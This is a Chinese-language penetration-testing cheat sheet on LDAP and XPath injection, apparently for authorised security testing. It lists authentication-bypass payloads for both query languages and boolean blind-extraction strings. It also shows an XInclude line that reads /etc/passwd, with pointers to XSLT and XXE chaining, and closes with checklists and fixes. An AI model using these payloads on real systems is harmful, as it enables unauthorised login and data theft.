# LDAP 注入 + XPath 注入（目录服务与 XML 查询面）

> 两个被低估的注入面：目标用 LDAP 做认证/用户查询、或 XML 文档做查询解析时，注入点在认证与数据提取上都有高价值。全部授权测试手法。

## 一、LDAP 注入

### 1. 入口与语法
- **入口**：登录表单（`(&(uid=USER)(password=PASS))`）、用户搜索、组成员查询、属性过滤器
- **语法**：`&`(AND)、`|`(OR)、`!`(NOT)、`=`,`>=`,`<=`,`~=`,`*`(通配)、`(attr=value)` 过滤
- **特征**：报错含 `LDAP`/`search filter`/RFC 2254 错误

### 2. 认证绕过 Payload
```
# 原查询: (&(uid=USER)(password=PASS))
username=admin&password=*                    # 密码通配符
username=admin&password=*)(&                 # 闭合+追加真条件
username=admin&password=<REDACTED>   # 复杂绕过
username=admin&password=*)(|(password=*      # 任意密码
username=admin&password=*))%00               # NULL 截断（老 LDAP）
username=*)(uid=*))(|(uid=*&password=*       # 用户名位注入
```

### 3. 信息提取（AND 型盲注）
- **布尔差分**：`(uid=*)(|(cn=admin))` vs `(uid=*)(|(cn=xxxx))` 响应差异
- **属性枚举**：`(objectClass=*)(memberOf=CN=Admins,OU=...)` 探测组成员
- 自动化：逐字符盲注脚本（python-ldap 或直接用 http 层布尔逻辑）
- **常见属性速查**：`uid`/`cn`/`mail`/`userPassword`/`memberOf`/`objectClass`/`sAMAccountName`（AD）

### 4. OR 型注入
- 布尔条件翻转：`|(&(uid=user)(password=<REDACTED> 类构造
- 目标：绕过认证 or 提取多条记录（列表差分）

### 5. 目录遍历
- AD 场景：`LDAP_MATCHING_RULE_IN_CHAIN`（1.2.840.113556.1.4.1941）组嵌套枚举
- 云目录（Azure AD/Okta 相关 API 参数注入）同逻辑

### 6. 检查清单
```
□ 登录/搜索参数都能进过滤器吗？
□ 通配符 * 有没有被过滤？（`admin*` 通配枚举）
□ 过滤字符过滤了没？（) ( \ *）
□ 报错是否泄露完整过滤器（信息泄露辅助）
□ 布尔差分是否稳定可盲注
```

## 二、XPath 注入

### 1. 入口与语法
- **入口**：XML 文档查询（用户登录、配置查询、动态 `//node[param='x']`）
- **对比 SQL**：无注释语法（`--` 无效），用 `or '1'='1`/`or true()`
- **特征**：报错含 `XPath`/`XPATH`/`org.xml` 或 500

### 2. 认证绕过 Payload
```
# 原查询: //user[name/text()='INPUT' and password/text()='PASS']
' or '1'='1
' or '1' or '1
' or true() or '
' or 1=1 or '
admin' or '1'='1                 # 知道用户名时
admin' and password/text()='x' or '1'='1
```

### 3. XML 结构探测
- 先确认 XML 结构：`' or count(/users/*)>10 or '1'='1`（节点数布尔）
- 枚举节点名：`count(//nodeName)` 差分探测元素存在
- XPath 2.0 函数面：`string-length()`、`contains()`、`substring()`（盲注逐字符）

### 4. 信息提取（布尔盲注）
```
# 探测 /users/user[1]/username
' or substring(//users/user[1]/username,1,1)='a' or '1'='1
# 逐步提取：python 脚本逐位爆破（返回差异为判断）
```

### 5. 链式攻击（升级）
- **XPath + XInclude**：`<xi:include parse="text" href="file:///etc/passwd"/>` 读文件
- **XSLT 联动**：XPath 结果进 XSLT 处理 → `xslt-injection` 的 document()/扩展函数 RCE
- **XXE 联动**：XML 解析层同时测 `xxe-test.md`（外带/SSRF）
- **NoSQL 图查询**：LDAP/GraphQL 交叉面（图数据库查询同样走类 XPath 路径语法）

### 6. 检查清单
```
□ 用户输入是否进 XPath 拼接查询？
□ 单引号/双引号是否被转义（`"` 也试）？
□ 布尔差分是否稳定（true vs false 响应差异）
□ 与 XML 解析器缺陷联动测了吗（XXE/XInclude/XSLT）
```

## 三、报告要点
- 认证绕过 = 进号（高危起）；数据提取出他人数据 = 高危（差分证据）
- 附带测一遍 XXE/SSRF 链（XML 解析面常共存）
- 修复建议：参数化查询（LDAP 用过滤器转义库）、XPath 用参数化（编译表达式）、封禁用 XInclude/外部实体